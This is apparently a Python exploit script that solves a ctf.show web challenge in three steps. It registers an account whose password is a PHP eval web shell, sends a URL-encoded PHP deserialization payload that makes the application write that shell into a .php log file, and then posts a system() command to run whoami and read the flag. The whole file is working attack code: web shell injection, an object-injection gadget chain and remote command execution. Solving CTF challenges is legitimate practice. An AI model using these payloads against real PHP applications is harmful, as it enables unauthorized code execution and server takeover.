import requests
import time

url = "http://4f78e969-2d51-406b-a56c-53e035f59f59.challenge.ctf.show/"

def step1():
    data={
        "username":"userLogger",
        "password":"<?=eval($_POST[1]);?>.php"
    }
    response = requests.post(url=url+"index.php?action=do_register",data=data)
    time.sleep(1)
    if "script" in response.text:
        print("第一步执行完毕")
    else:
        print(response.text)
        exit()

def step2():
    data="token=user|O%3A11%3A%22application%22%3A6%3A%7Bs%3A6%3A%22cookie%22%3BO%3A13%3A%22cookie_helper%22%3A1%3A%7Bs%3A21%3A%22%00cookie_helper%00secret%22%3Bs%3A20%3A%22ctfshow_36d_boy_h1xa%22%3B%7Ds%3A5%3A%22mysql%22%3BO%3A12%3A%22mysql_helper%22%3A2%3A%7Bs%3A16%3A%22%00mysql_helper%00db%22%3Ba%3A7%3A%7Bs%3A3%3A%22dsn%22%3Bs%3A55%3A%22mysql%3Ahost%3D127.0.0.1%3Bdbname%3Dblog%3Bport%3D3306%3Bcharset%3Dutf8%22%3Bs%3A4%3A%22host%22%3Bs%3A9%3A%22127.0.0.1%22%3Bs%3A4%3A%22port%22%3Bs%3A4%3A%223306%22%3Bs%3A6%3A%22dbname%22%3Bs%3A4%3A%22blog%22%3Bs%3A8%3A%22username%22%3Bs%3A4%3A%22root%22%3Bs%3A8%3A%22password%22%3Bs%3A4%3A%22root%22%3Bs%3A7%3A%22charset%22%3Bs%3A4%3A%22utf8%22%3B%7Ds%3A6%3A%22option%22%3Ba%3A1%3A%7Bi%3A19%3Bi%3A262152%3B%7D%7Ds%3A9%3A%22dispather%22%3BN%3Bs%3A5%3A%22loger%22%3BO%3A10%3A%22userLogger%22%3A3%3A%7Bs%3A8%3A%22username%22%3BN%3Bs%3A20%3A%22%00userLogger%00password%22%3BN%3Bs%3A20%3A%22%00userLogger%00filename%22%3Bs%3A10%3A%22..%2Flog.txt%22%3B%7Ds%3A5%3A%22debug%22%3Bb%3A1%3Bs%3A10%3A%22dispatcher%22%3BO%3A10%3A%22dispatcher%22%3A0%3A%7B%7D%7D"
    response = requests.get(url=url+"index.php?action=main&token="+data)
    time.sleep(1)
    print("第二步执行完毕")

def step3():
    data={
        "1":"system('whoami && cat /f*');",
    }
    response = requests.post(url=url+"log.txt_-%3C%3F%3Deval(%24_POST%5B1%5D)%3B%3F%3E.php",data=data)
    time.sleep(1)
    if "www-data" in response.text:
        print("第三步 getshell 成功")
        print(response.text)
    else:
        print("第三步 getshell 失败")

if __name__ == '__main__':
    step1()
    step2()
    step3()